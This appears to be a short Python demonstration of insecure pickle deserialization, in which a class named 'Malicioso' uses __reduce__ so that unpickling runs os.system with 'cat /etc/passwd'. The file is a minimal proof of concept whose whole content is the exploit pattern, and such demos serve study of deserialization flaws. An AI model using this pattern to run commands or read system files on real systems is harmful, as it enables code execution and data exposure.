import os
import pickle

class Malicioso:
     def __reduce__(self):
        return (os.system, ("cat /etc/passwd",))

carga = pickle.loads(pickle.dumps(Malicioso()))

print(carga)